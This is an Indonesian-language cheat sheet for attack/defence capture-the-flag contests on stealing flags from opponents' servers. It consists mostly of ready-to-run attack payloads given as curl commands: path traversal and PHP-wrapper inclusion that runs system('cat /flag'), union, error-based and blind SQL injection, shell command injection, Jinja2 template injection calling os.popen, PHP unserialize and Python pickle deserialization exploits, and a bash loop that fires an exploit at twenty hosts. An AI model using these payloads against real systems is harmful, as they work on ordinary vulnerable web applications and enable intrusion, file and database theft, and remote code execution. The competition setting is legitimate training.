# 🚩 Flag Hunting & Extraction Bible — CTF A/D

> **Panduan LENGKAP mencuri flag dari server lawan. Semua teknik yang PASTI keluar di lomba.**

---

## 1. 📍 DIMANA FLAG BIASANYA DISIMPAN?

| Lokasi | Cara Baca | Probabilitas |
|---|---|---|
| `/flag` atau `/flag.txt` | `cat /flag` | 🔴 SANGAT SERING |
| `/home/ctf/flag.txt` | `cat /home/ctf/flag.txt` | 🟡 SERING |
| `/var/www/html/flag.txt` | `curl http://TARGET/flag.txt` | 🟡 SERING |
| Database (tabel `flags`) | `SELECT flag FROM flags` | 🔴 SANGAT SERING |
| Environment variable | `echo $FLAG` / `env \| grep FLAG` | 🟢 KADANG |
| Endpoint API | `GET /api/flag` atau `GET /flag` | 🟡 SERING |
| File config (`config.php`, `.env`) | LFI baca file | 🟢 KADANG |
| Dinamis per-tick (checker taruh) | Harus baca setiap tick | 🔴 SANGAT SERING |

---

## 2. 📖 TEKNIK BACA FLAG VIA LFI (Local File Inclusion)

```bash
# === PATH TRAVERSAL KLASIK === #
curl "http://TARGET/page.php?file=../../../../flag"
curl "http://TARGET/page.php?file=../../../../flag.txt"
curl "http://TARGET/page.php?page=../../../../etc/passwd"
curl "http://TARGET/index.php?lang=../../../../flag"

# Variasi parameter umum di CTF:
# ?file=  ?page=  ?lang=  ?template=  ?include=  ?view=  ?doc=  ?path=

# === PHP WRAPPER (Baca Source Code!) === #
# Base64 encode (bypass filter ekstensi .php)
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=/flag"
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=config"
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index"
# Decode hasilnya:
echo "HASIL_BASE64" | base64 -d

# Data wrapper (inject PHP code)
curl "http://TARGET/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg=="
# ^ itu base64 dari: <?php system('cat /flag');?>

# Input wrapper (kirim PHP code via POST body)
curl "http://TARGET/page.php?file=php://input" -d "<?php system('cat /flag'); ?>"

# === BYPASS FILTER === #
# Double encoding
curl "http://TARGET/page.php?file=..%252f..%252f..%252f..%252fflag"

# Null byte (PHP < 5.3)
curl "http://TARGET/page.php?file=../../../../flag%00"
curl "http://TARGET/page.php?file=../../../../flag.txt%00.php"

# Path truncation (sangat panjang ../ berulang)
curl "http://TARGET/page.php?file=....//....//....//....//flag"

# Case bypass
curl "http://TARGET/page.php?file=....\/....\/....\/flag"
```

---

## 3. 💉 TEKNIK BACA FLAG VIA SQLi

```bash
# === STEP 1: DETEKSI JUMLAH KOLOM === #
curl "http://TARGET/user.php?id=1 ORDER BY 1-- -"    # OK
curl "http://TARGET/user.php?id=1 ORDER BY 5-- -"    # ERROR = ada 4 kolom
# atau:
curl "http://TARGET/user.php?id=1 UNION SELECT NULL,NULL,NULL,NULL-- -"

# === STEP 2: CARI DATABASE & TABEL === #
# Nama database
curl "http://TARGET/user.php?id=0 UNION SELECT 1,database(),3,4-- -"

# Semua tabel
curl "http://TARGET/user.php?id=0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -"

# Kolom di tabel 'flags'
curl "http://TARGET/user.php?id=0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='flags'-- -"

# === STEP 3: BACA FLAG! === #
curl "http://TARGET/user.php?id=0 UNION SELECT 1,flag,3,4 FROM flags-- -"
curl "http://TARGET/user.php?id=0 UNION SELECT 1,GROUP_CONCAT(flag),3,4 FROM flags-- -"

# === ALTERNATIF: LOAD_FILE (Baca file dari disk) === #
curl "http://TARGET/user.php?id=0 UNION SELECT 1,LOAD_FILE('/flag'),3,4-- -"
curl "http://TARGET/user.php?id=0 UNION SELECT 1,LOAD_FILE('/flag.txt'),3,4-- -"

# === POST METHOD SQLi === #
curl "http://TARGET/login.php" -d "username=admin' UNION SELECT 1,flag,3 FROM flags-- -&password=x"
curl "http://TARGET/login.php" -d "username=' OR 1=1-- -&password=x"

# === ERROR-BASED SQLi === #
curl "http://TARGET/user.php?id=1' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)))-- -"

# === BOOLEAN BLIND === #
# Karakter ke-1 = 'F'?
curl "http://TARGET/user.php?id=1' AND (SELECT SUBSTRING(flag,1,1) FROM flags LIMIT 1)='F'-- -"

# === TIME-BASED BLIND === #
curl "http://TARGET/user.php?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM flags)='F',SLEEP(2),0)-- -"
```

---

## 4. 🖥️ TEKNIK BACA FLAG VIA RCE (Command Injection)

```bash
# === SEMICOLON SEPARATOR === #
curl "http://TARGET/ping.php" -d "ip=;cat /flag"
curl "http://TARGET/ping.php" -d "ip=127.0.0.1;cat /flag"

# === PIPE === #
curl "http://TARGET/ping.php" -d "ip=|cat /flag"
curl "http://TARGET/ping.php" -d "ip=127.0.0.1|cat /flag"

# === BACKTICK === #
curl "http://TARGET/ping.php" -d 'ip=`cat /flag`'

# === DOLLAR SUBSHELL === #
curl "http://TARGET/ping.php" -d 'ip=$(cat /flag)'

# === AND/OR CHAIN === #
curl "http://TARGET/ping.php" -d "ip=127.0.0.1 && cat /flag"
curl "http://TARGET/ping.php" -d "ip=127.0.0.1 || cat /flag"

# === NEWLINE INJECTION === #
curl "http://TARGET/ping.php" -d "ip=127.0.0.1%0acat /flag"

# === VIA WEBSHELL (Jika sudah ada) === #
curl "http://TARGET/shell.php?c=cat+/flag"
curl "http://TARGET/shell.php?c=find+/+-name+flag*+2>/dev/null"
curl "http://TARGET/shell.php?c=env+|+grep+FLAG"
curl "http://TARGET/shell.php?c=cat+/var/www/html/config.php"
```

---

## 5. 🐍 TEKNIK BACA FLAG VIA SSTI (Flask / Jinja2)

```bash
# === DETEKSI SSTI === #
curl "http://TARGET/hello?name={{7*7}}"
# Jika output = 49, berarti RENTAN SSTI!

# === BACA FLAG === #
curl 'http://TARGET/hello?name={{lipsum.__globals__.os.popen("cat /flag").read()}}'
curl 'http://TARGET/hello?name={{config.__class__.__init__.__globals__["os"].popen("cat /flag").read()}}'
curl 'http://TARGET/hello?name={{request.application.__globals__.__builtins__.__import__("os").popen("cat /flag").read()}}'
curl 'http://TARGET/hello?name={{cycler.__init__.__globals__.os.popen("cat /flag").read()}}'

# === BACA CONFIG (Flask secret key, database URI, dll) === #
curl "http://TARGET/hello?name={{config.items()}}"
curl "http://TARGET/hello?name={{config.SECRET_KEY}}"

# === BYPASS FILTER (Jika {{}} diblokir) === #
curl 'http://TARGET/hello?name={%print(lipsum.__globals__.os.popen("cat /flag").read())%}'
```

---

## 6. 🔓 TEKNIK BACA FLAG VIA DESERIALIZATION

### PHP unserialize
```bash
# Jika ada parameter yang di-unserialize (cookie, POST data)
# Buat payload yang memanggil system() via magic method __destruct()
# (Perlu tahu class yang tersedia di source code target)

# Contoh payload (base64 encoded):
# O:4:"User":1:{s:4:"name";s:19:"system('cat /flag')";}
echo -n 'O:4:"User":1:{s:4:"name";s:19:"system('\''cat /flag'\'')";}' | base64
```

### Python pickle
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
# Kirim payload ini ke parameter yang di-pickle.loads()
```

---

## 7. 🔄 MASS FLAG EXTRACTION LOOP (OTOMATIS SEMUA TIM!)

### Bash Script (Untuk Exploit yang Sudah Ditemukan)
```bash
#!/bin/bash
# mass_extract.sh — Loop semua tim lawan
# GANTI curl command sesuai exploit yang ditemukan!

PATTERN='(FLAG|JCSC|CTF|CYBER)\{[^}]+\}'

for i in $(seq 1 20); do
    IP="10.60.$i.1"

    # ===== GANTI BARIS INI SESUAI EXPLOIT ===== #
    RESP=$(curl -s --max-time 3 "http://$IP/page.php?file=../../../../flag" 2>/dev/null)
    # ============================================ #

    FLAG=$(echo "$RESP" | grep -oP "$PATTERN" | head -1)
    if [ -n "$FLAG" ]; then
        echo "[+] $IP -> $FLAG"
        echo "[$(date +%H:%M:%S)] $IP -> $FLAG" >> captured_flags.txt
    fi
    sleep 1  # WAJIB delay (anti-DoS rule)
done
```

### Menggunakan adctf.py (Lebih Canggih)
```bash
# Probe manual ke semua lawan dengan payload tertentu
python3 adctf.py probe -t 10.60.1-20.1 -e /page.php -p file -payload "../../../../flag"

# Autopilot (otomatis tangkap WAF log + replay + submit)
python3 adctf.py autopilot --targets 10.60.1-20.1 --submit-url http://10.0.0.1/api/submit --token TOKEN
```

---

## 8. 🔍 FLAG REGEX PATTERNS

```bash
# Regex untuk grep flag dari response
grep -oP '(FLAG|JCSC|CTF|CYBER|flag)\{[^}]+\}'

# Grep dari file
grep -rP '(FLAG|JCSC|CTF|CYBER)\{[^}]+\}' /var/www/html/

# Grep dari curl response
curl -s "http://TARGET/..." | grep -oP '(FLAG|JCSC|CTF|CYBER)\{[^}]+\}'

# Python regex
import re
flags = re.findall(r'(?:FLAG|JCSC|CTF|CYBER)\{[^\}]+\}', response_text)
```

---

## 9. 📋 CHECKLIST URUTAN EKSPLOITASI

```
1. Coba LFI dulu (paling mudah & sering ada):
   ?file=../../../../flag
   ?page=php://filter/convert.base64-encode/resource=/flag

2. Coba SQLi (kedua paling sering):
   ?id=0 UNION SELECT 1,flag,3 FROM flags-- -

3. Coba RCE / Command Injection:
   ip=;cat /flag
   ip=|cat /flag

4. Coba SSTI (jika Flask/Jinja2):
   ?name={{lipsum.__globals__.os.popen("cat /flag").read()}}

5. Cari webshell yang sudah ada (dari attacker lain):
   /shell.php?c=cat+/flag
   /cmd.php?cmd=cat+/flag

6. Coba deserialization (jika ada cookie/token suspicious):
   Inject pickle/unserialize payload
```
